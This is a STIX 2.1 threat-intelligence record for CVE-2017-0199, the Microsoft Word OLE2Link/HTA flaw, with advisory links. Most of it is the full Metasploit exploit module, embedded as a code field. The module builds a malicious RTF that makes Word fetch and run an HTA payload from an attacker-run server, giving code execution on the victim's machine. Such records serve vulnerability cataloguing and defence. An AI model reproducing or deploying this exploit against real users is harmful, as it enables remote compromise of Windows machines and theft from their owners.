{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5833e53a-9b2b-47d6-b3bd-fac913e81a55",
    "created": "2024-08-14T16:37:04.152502Z",
    "modified": "2024-08-14T16:37:04.152506Z",
    "name": "\"Microsoft Office Word Malicious Hta Execution\"",
    "description": " This module creates a malicious RTF file that when opened in vulnerable versions of Microsoft Word will lead to code execution. The flaw exists in how a olelink object can make a http(s) request and execute hta code in response.  This bug was originally seen being exploited in the wild starting in Oct 2016. This module was created by reversing a public malware sample. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/office_word_hta.rb",
            "external_id": "office_word_hta.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0199"
        },
        {
            "source_name": "reference",
            "url": "https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.helpnetsecurity.com/2017/04/10/ms-office-zero-day/"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.checkpoint.com/defense/advisories/public/2017/cpai-2017-0251.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Office%20zero-day%20(April%202017)/2017-04%20Office%20OLE2Link%20zero-day%20v0.4.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/"
        },
        {
            "source_name": "reference",
            "url": "https://www.hybrid-analysis.com/sample/ae48d23e39bf4619881b5c4dd2712b8fabd4f8bd6beb0ae167647995ba68100e?environmentId=100"
        },
        {
            "source_name": "reference",
            "url": "https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://www.microsoft.com/en-us/download/details.aspx?id=10725"
        },
        {
            "source_name": "reference",
            "url": "https://msdn.microsoft.com/en-us/library/dd942294.aspx"
        },
        {
            "source_name": "reference",
            "url": "https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-CFB/MS-CFB.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => \"Microsoft Office Word Malicious Hta Execution\",\n      'Description'    => %q{\n        This module creates a malicious RTF file that when opened in\n        vulnerable versions of Microsoft Word will lead to code execution.\n        The flaw exists in how a olelink object can make a http(s) request,\n        and execute hta code in response.\n\n        This bug was originally seen being exploited in the wild starting\n        in Oct 2016. This module was created by reversing a public\n        malware sample.\n      },\n      'Author'         =>\n        [\n          'Haifei Li', # vulnerability analysis\n          'ryHanson',\n          'wdormann',\n          'DidierStevens',\n          'vysec',\n          'Nixawk', # module developer\n          'sinn3r'  # msf module improvement\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        ['CVE', '2017-0199'],\n        ['URL', 'https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/'],\n        ['URL', 'https://www.fireeye.com/blog/threat-research/2017/04/acknowledgement_ofa.html'],\n        ['URL', 'https://www.helpnetsecurity.com/2017/04/10/ms-office-zero-day/'],\n        ['URL', 'https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html'],\n        ['URL', 'https://www.checkpoint.com/defense/advisories/public/2017/cpai-2017-0251.html'],\n        ['URL', 'https://github.com/nccgroup/Cyber-Defence/blob/master/Technical%20Notes/Office%20zero-day%20(April%202017)/2017-04%20Office%20OLE2Link%20zero-day%20v0.4.pdf'],\n        ['URL', 'https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/'],\n        ['URL', 'https://www.hybrid-analysis.com/sample/ae48d23e39bf4619881b5c4dd2712b8fabd4f8bd6beb0ae167647995ba68100e?environmentId=100'],\n        ['URL', 'https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/'],\n        ['URL', 'https://www.microsoft.com/en-us/download/details.aspx?id=10725'],\n        ['URL', 'https://msdn.microsoft.com/en-us/library/dd942294.aspx'],\n        ['URL', 'https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-CFB/[MS-CFB].pdf'],\n        ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199']\n      ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Microsoft Office Word', {} ]\n        ],\n      'DefaultOptions' =>\n        {\n          'DisablePayloadHandler' => false\n        },\n      'DefaultTarget'  => 0,\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-04-14'))\n\n    register_options([\n      OptString.new('FILENAME', [ true, 'The file name.', 'msf.doc']),\n      OptString.new('URIPATH',  [ true, 'The URI to use for the HTA file', 'default.hta'])\n    ])\n  end\n\n  def generate_uri\n    uri_maxlength = 112\n\n    host = datastore['SRVHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['SRVHOST']\n    scheme = datastore['SSL'] ? 'https' : 'http'\n\n    uri = \"#{scheme}://#{host}:#{datastore['SRVPORT']}#{'/' + Rex::FileUtils.normalize_unix_path(datastore['URIPATH'])}\"\n    uri = Rex::Text.hexify(Rex::Text.to_unicode(uri))\n    uri.delete!(\"\\n\")\n    uri.delete!(\"\\\\x\")\n    uri.delete!(\"\\\\\")\n\n    padding_length = uri_maxlength * 2 - uri.length\n    fail_with(Failure::BadConfig, \"please use a uri < #{uri_maxlength} bytes \") if padding_length < 0\n    padding_length.times { uri << \"0\" }\n    uri\n  end\n\n  def create_ole_ministream_data\n    # require 'rex/ole'\n    # ole = Rex::OLE::Storage.new('cve-2017-0199.bin', Rex::OLE::STGM_READ)\n    # ministream = ole.instance_variable_get(:@ministream)\n    # ministream_data = ministream.instance_variable_get(:@data)\n\n    ministream_data = \"\"\n    ministream_data << \"01000002090000000100000000000000\" # 00000000: ................\n    ministream_data << \"0000000000000000a4000000e0c9ea79\" # 00000010: ...............y\n    ministream_data << \"f9bace118c8200aa004ba90b8c000000\" # 00000020: .........K......\n    ministream_data << generate_uri\n    ministream_data << \"00000000795881f43b1d7f48af2c825d\" # 000000a0: ....yX..;..H.,.]\n    ministream_data << \"c485276300000000a5ab0000ffffffff\" # 000000b0: ..'c............\n    ministream_data << \"0609020000000000c000000000000046\" # 000000c0: ...............F\n    ministream_data << \"00000000ffffffff0000000000000000\" # 000000d0: ................\n    ministream_data << \"906660a637b5d2010000000000000000\" # 000000e0: .f`.7...........\n    ministream_data << \"00000000000000000000000000000000\" # 000000f0: ................\n    ministream_data << \"100203000d0000000000000000000000\" # 00000100: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000110: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000120: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000130: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000140: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000150: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000160: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000170: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000180: ................\n    ministream_data << \"00000000000000000000000000000000\" # 00000190: ................\n    ministream_data << \"00000000000000000000000000000000\" # 000001a0: ................\n    ministream_data << \"00000000000000000000000000000000\" # 000001b0: ................\n    ministream_data << \"00000000000000000000000000000000\" # 000001c0: ................\n    ministream_data << \"00000000000000000000000000000000\" # 000001d0: ................\n    ministream_data << \"00000000000000000000000000000000\" # 000001e0: ................\n    ministream_data << \"00000000000000000000000000000000\" # 000001f0: ................\n    ministream_data\n  end\n\n  def create_rtf_format\n    template_path = ::File.join(Msf::Config.data_directory, \"exploits\", \"cve-2017-0199.rtf\")\n    template_rtf = ::File.open(template_path, 'rb')\n\n    data = template_rtf.read(template_rtf.stat.size)\n    data.gsub!('MINISTREAM_DATA', create_ole_ministream_data)\n    template_rtf.close\n    data\n  end\n\n  def on_request_uri(cli, req)\n    p = regenerate_payload(cli)\n    data = Msf::Util::EXE.to_executable_fmt(\n      framework,\n      ARCH_X86,\n      'win',\n      p.encoded,\n      'hta-psh',\n      { :arch => ARCH_X86, :platform => 'win' }\n    )\n\n    send_response(cli, data, 'Content-Type' => 'application/hta')\n  end\n\n  def exploit\n    file_create(create_rtf_format)\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-04-14",
    "x_mitre_platforms": [
        "win'"
    ]
}